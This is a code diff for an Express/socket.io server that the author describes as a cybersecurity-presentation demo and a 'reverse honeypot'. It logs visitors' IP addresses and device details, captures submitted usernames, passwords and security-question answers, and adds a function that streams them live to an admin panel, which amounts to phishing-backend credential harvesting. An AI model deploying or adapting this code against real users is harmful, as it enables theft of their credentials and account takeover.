@@ -7,8 +7,9 @@
 // that seriousness aside, this was for a cybersecurity presentation. well...i don't care about
 // cybersecurity right now. (i do, but not for this demo, also this is behind a reverse proxy)
 
-// also why would i want a site like this to be secured? it's basically a reverse honeypot. 
+// also why would i want a site like this to be secured? it's basically a reverse honeypot.
 
+import { password } from "bun";
 import express from "express";
 import http from "http";
 import { Server, Socket } from "socket.io";
@@ -52,11 +53,11 @@ io.on("connection", (socket) => {
     // you kow what ill convert it for you: 0xdeadbeef in ip form (octets) -> de.ad.be.ef -> 222.173.190.239, which at this
     // moment either doesnt have anything on the other end of it or it has icmp turned off because all i did was ping it
     // actually i looked it up in a geolocation database and its some random IP address in china? cool i guess...
-    // off on a tangent as always! anyways heres some more terible code that i wrote 
+    // off on a tangent as always! anyways heres some more terible code that i wrote
 
     const ipAddr = socket.handshake.headers["x-forwarded-for"] ?? socket.handshake.address;
     const hasConnected = false;//addrCache.has(ipAddr);
-    
+
     // great code right?
     let pseudoSid = sidMap.get(socket.id);
     if (!pseudoSid) {
@@ -64,15 +65,42 @@ io.on("connection", (socket) => {
         sidMap.set(socket.id, pseudoSid); // set random pseudosid 0-999
     }
 
+    sendAdmin("client", { sid: pseudoSid });
+
     if (!hasConnected) {
         addrCache.add(ipAddr);
         sendLog(`[${pseudoSid}] IP address: ${ipAddr}`);
 
+        sendAdmin("update", { sid: pseudoSid, ip: ipAddr });
+
         // writing this was painful. actually no it wasnt im just dont want to fix it
         const ua = new UAParser(socket.handshake.headers["user-agent"]);
-        sendLog(`[${pseudoSid}] Browser: ${ua.getBrowser().name ?? "unknown"} ${ua.getBrowser().version ?? "(unknown version)"}`);
-        sendLog(`[${pseudoSid}] OS: ${ua.getOS().name} ${ua.getOS().version ?? "unknown"}`);
-        sendLog(`[${pseudoSid}] Device: ${ua.getDevice().vendor ?? "(unknown vendor)"} ${ua.getDevice().model ?? "(unknown model)"}`);
+
+        const browserName = ua.getBrowser().name;
+        //sendAdmin("update", { sid: pseudoSid, browserName });
+
+        const browserVer = ua.getBrowser().version;
+        //sendAdmin("update", { sid: pseudoSid, browserVer });
+
+        const osName = ua.getOS().name;
+        //sendAdmin("update", { sid: pseudoSid, osName });
+
+        const osVer = ua.getOS().version;
+        //sendAdmin("update", { sid: pseudoSid, osVer });
+
+        const devVendor = ua.getDevice().vendor;
+        //sendAdmin("update", { sid: pseudoSid, devVendor });
+
+        const devModel = ua.getDevice().model;
+        //sendAdmin("update", { sid: pseudoSid, devModel });
+
+        sendAdmin("update", {
+            sid: pseudoSid,
+            device:
+                `${osName ? `${osName}` : ""}${devVendor ? `${devVendor} ` : ""}${devModel ? `${devModel} ` : ""}`,
+        });
+
+
     }
 
     socket.on("admin", (data) => {
@@ -89,7 +117,7 @@ io.on("connection", (socket) => {
         sendLog(`[${pseudoSid}] Connection authorized.`);
         socket.emit("adminauth", { success: true });
 
-        // disconnect 
+        // disconnect
         authorizedCns.add(socket);
         socket.on("disconnect", () => authorizedCns.delete(socket));
     });
@@ -99,13 +127,21 @@ io.on("connection", (socket) => {
             cn.emit("log", data);
     }
 
+    function sendAdmin(disc: string, data: any) {
+        for (const cn of authorizedCns)
+            cn.emit(disc, data);
+    }
+
     socket.on("credentials", (data) => {
         sendLog(`[${pseudoSid}] Username: ${data.username}`);
+        sendAdmin("update", { sid: pseudoSid, username: data.username, password: data.password });
         sendLog(`[${pseudoSid}] Password: ${data.password}`);
     });
 
+    let sqctr = 0;
     // oh now i remember what those weird messages were. sq stands for security question i shouldve known that
     socket.on("sq", (data) => {
+        sendAdmin("update", { sid: pseudoSid, ["q" + (++sqctr)]: data.answer });
         sendLog(`[${pseudoSid}] Security Question: "${data.question}", answered "${data.answer}"`);
     });
 
